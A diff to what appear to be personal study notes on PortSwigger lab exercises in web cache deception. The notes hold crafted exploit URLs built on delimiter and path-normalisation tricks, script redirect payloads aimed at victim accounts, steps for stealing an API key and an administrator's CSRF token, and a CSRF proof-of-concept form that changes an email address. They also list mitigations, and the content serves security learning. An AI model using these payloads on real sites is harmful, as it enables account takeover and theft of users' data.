@@ -1627,7 +1627,13 @@ CONNECT
 
 **Constructing a web cache deception attack steps**
 - Identify a target endpoint that returns a dynamic response containing sensitive information (`GET`, `HEAD`, `OPTION`)
-- Identify discrepancy in how the cache and origin server parse the URL path (Map URLs to resource, process delimeter characters, normalize paths)
+- Identify discrepancy in how the cache and origin server parse the URL path
+  - Map URLs to resource
+    `/api/orders/123/aaa`
+  - process delimeter characters
+    `/settings/users/list;aaa`
+  - normalize paths
+    `/<static-directory-prefix>/..%2f<dynamic-path>`
 - Craft a malicious URL that uses the discrepancy to trick the cache into storing a dynamic response
 - use a cache buster (diff cache key) or Burp extension "Param miner > Settings > Add dynamic cachebuster)
 
@@ -1639,6 +1645,12 @@ CONNECT
 | **X-Cache: dynamic**  | The response is not suitable for caching |
 | **X-Cache: refresh**  | The cached content was outdated and needed to be refreshed or revalidated. |
 | **Cache-Control**     | Controls how, and for how long, the resource is cached by browsers and intermediate caches. Misconfiguration (e.g., `public`) can lead to caching sensitive or poisoned responses. |
+
+**Mitigation**
+- Cache-Control headers, set with `no-store` abd `private`
+- Configure your CDN settings so that your caching rules don't override the Cache-Control header.
+- CDNs enable protecction
+- Aren't any discrepancies between how the origin server and the cache interpret URL paths
 
 ### Web cache deception Lab (NEW 2025/09)
 - Exploiting **path mapping** for web cache deception
@@ -1661,7 +1673,7 @@ CONNECT
       1st: /my-account/abc > 404 not found
       2nd: /my-accountabc > 404 not found  
       ```
-   - send to intruder > /my-account§a§bc > Payload settings [Simple list] [delimiters](https://portswigger.net/web-security/web-cache-deception/wcd-lab-delimiter-list) > Under Payload encoding, deselect `URL-encode these characters` > `;`,`?` 200 status
+   - send to intruder > /my-account§§abc > Payload settings [Simple list] [delimiters](https://portswigger.net/web-security/web-cache-deception/wcd-lab-delimiter-list) > Under Payload encoding, deselect `URL-encode these characters` > `;`,`?` 200 status
   - Investigate path delimiter discrepancies
     - /my-account?abc.js > repeater > no cache
     - /my-account;abc.js > repeater > X-Cache: miss
@@ -1670,9 +1682,85 @@ CONNECT
     - Deliver exploit to victim
     - Go to the URL that you delivered to carlos in your exploit
       `https://YOUR-LAB-ID.web-security-academy.net/my-account;wcd.js`
-- dd
-- dd
-- dd
+- Exploiting **origin server normalization** for web cache deception
+  - Investigate path delimiter discrepancies
+    - send to intruder > /my-account§§abc > Payload settings [Simple list] [delimiters](https://portswigger.net/web-security/web-cache-deception/wcd-lab-delimiter-list) > Under Payload encoding, deselect `URL-encode these characters` > `?` 200 status
+  - Investigate normalization discrepancies
+    - Proxy > HTTP history > /resources
+    - GET /my-account > repeater > change the path
+      ```
+      1st: /aaa/..%2fmy-account > 200 response
+      2nd: /resources/..%2fYOUR-RESOURCE > 404 not found  > X-Cache: miss
+      3rd: /resources/aaa > 404 not found  > X-Cache: miss
+      ```
+  - Craft an exploit
+    `/resources/../my-account`
+    - Body `<script>document.location="https://YOUR-LAB-ID.web-security-academy.net/resources/..%2fmy-account"</script>`
+    - Deliver exploit to victim
+    - Go to the URL that you delivered to carlos in your exploit
+      `https://YOUR-LAB-ID.web-security-academy.net/resources/..%2fmy-account`
+  - Notice that the response includes the API key for carlos
+- Exploiting **cache server normalization** for web cache deception
+  - Investigate path delimiters used by the origin server
+    - send to intruder > /my-account§§abc > Payload settings [Simple list] [delimiters](https://portswigger.net/web-security/web-cache-deception/wcd-lab-delimiter-list) > Under Payload encoding, deselect `URL-encode these characters` > `#`, `?`, `%23`, and `%3f` 302 status
+  - Investigate path delimiter discrepancies
+    - GET /my-account > repeater > change the path
+      ```
+      1st: /my-account?abc.js > 302 no cache
+      2nd: /my-account%23abc.js > 302 no cache
+      3rd: /my-account%3fabc.js > 302 no cache
+      ```
+  - Investigate normalization discrepancies
+    - GET /my-account > repeater > change the path
+      ```
+      1st: /aaa/..%2fmy-account > 404 no cache
+      2nd: /aaa/..%2fresources/YOUR-RESOURCE > 404 cache miss
+      3rd: /resources/..%2fYOUR-RESOURCE > 404 no cache
+      ```
+  - Craft an exploit
+    `my-account#/../resources`
+    - Body `<script>document.location="https://YOUR-LAB-ID.web-security-academy.net/my-account%23%2f%2e%2e%2fresources?wcd"</script>`
+    - Deliver exploit to victim
+    - Go to the URL that you delivered to carlos in your exploit
+      `https://YOUR-LAB-ID.web-security-academy.net/my-account%23%2f%2e%2e%2fresources?wcd`
+- Exploiting exact-match cache rules for web cache deception
+  - Investigate path delimiter discrepancies
+     - send to intruder > /my-account§§abc > Payload settings [Simple list] [delimiters](https://portswigger.net/web-security/web-cache-deception/wcd-lab-delimiter-list) > Under Payload encoding, deselect `URL-encode these characters` > '/', `；`，`?` 302 status
+  - Investigate normalization discrepancies
+    -  GET /my-account > repeater > change the path
+      ```
+      1st: /aaa/..%2fmy-account > 404 no cache
+      2nd: /robots.txt > 200 cache miss
+      3rd: /aaa/..%2frobots.txt > 200 cache miss
+      ```
+  - Exploit the vulnerability to find the administrator's CSRF token
+    -  GET /my-account > repeater > change the path
+      ```
+      GET /my-account;/../robots.txt
+      1st: /my-account?%2f%2e%2e%2frobots.txt > 200 cache
+      ```
+    - Exploit
+      `<script>document.location="https://YOUR-LAB-ID.web-security-academy.net/my-account;%2f%2e%2e%2frobots.txt?wcd"</script>`
+    - browse victim url > 200 response > grab the administrator CSRF token
+      `https://YOUR-LAB-ID.web-security-academy.net/my-account;%2f%2e%2e%2frobots.txt?wcd`
+  - Craft an exploit
+    - POST /my-account/change-email > repeater > replace the CSRF token > Generate CSRF PoC > change email > store > deliver exploit to victim > change the email address for the user administrator
+      ```
+      <html>
+	  <!-- CSRF PoC - generated by Burp Suite Professional -->
+	  <body>
+	    <form action="https://0ad800790342d08780642b75001e0016.web-security-academy.net/my-account/change-email" method="POST">
+	      <input type="hidden" name="email" value="check&#64;gmail&#46;com" />
+	      <input type="hidden" name="csrf" value="iXhAiOkuFk6FiXf3QuZun4oq9T3b8LpT" />
+	      <input type="submit" value="Submit request" />
+	    </form>
+	    <script>
+	      history.pushState('', '', '/');
+	      document.forms[0].submit();
+	    </script>
+	  </body>
+	</html>
+      ```
 
 ## WebSockets
 - WebSocket connections are initiated over HTTP and are typically long-lived. essages can be sent in either direction at any time and are not transactional in nature.
